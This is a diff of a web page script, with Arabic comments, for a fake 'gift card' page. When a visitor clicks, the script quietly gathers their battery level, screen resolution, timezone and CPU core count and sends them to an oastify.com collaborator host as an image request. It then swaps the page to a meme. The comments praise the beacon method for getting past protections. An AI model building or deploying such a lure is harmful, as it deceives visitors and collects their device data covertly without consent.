@@ -27,15 +27,29 @@
     </div>
 
     <script>
-        function capture() {
-            // ملاحظة: تأكد ان هذا الرابط هو نفسه اللي في الـ Collaborator عندك الآن
+        async function capture() {
+            // رابط البرب حقك (تأكد إنه اللي مفتوح عندك حالياً)
             var tracker = "https://0qrchf9ywsx6grs0hod0h4xfx633rtfi.oastify.com";
 
-            // طريقة الـ Image Beacon (الأقوى لتخطي الحماية وسحب الـ IP ونوع الجهاز)
-            var logger = new Image();
-            logger.src = tracker + "/?log=click&t=" + new Date().getTime() + "&ua=" + encodeURIComponent(navigator.userAgent);
+            let batteryInfo = "Unknown";
+            try {
+                // محاولة سحب نسبة البطارية
+                const battery = await navigator.getBattery();
+                batteryInfo = (battery.level * 100).toFixed(0) + "%";
+            } catch (e) { }
 
-            // تبديل المحتوى للميمز المضحك
+            // تجميع المعلومات التقنية في رابط واحد
+            var details = "/?log=click" + 
+                          "&bat=" + batteryInfo + 
+                          "&res=" + screen.width + "x" + screen.height + 
+                          "&tz=" + encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone) +
+                          "&cores=" + navigator.hardwareConcurrency;
+
+            // إرسال البيانات فوراً للبرب كـ "طلب صورة"
+            var logger = new Image();
+            logger.src = tracker + details;
+
+            // تبديل الواجهة للميمز
             document.getElementById("gift-card").style.display = "none";
             document.getElementById("meme-view").style.display = "block";
         }
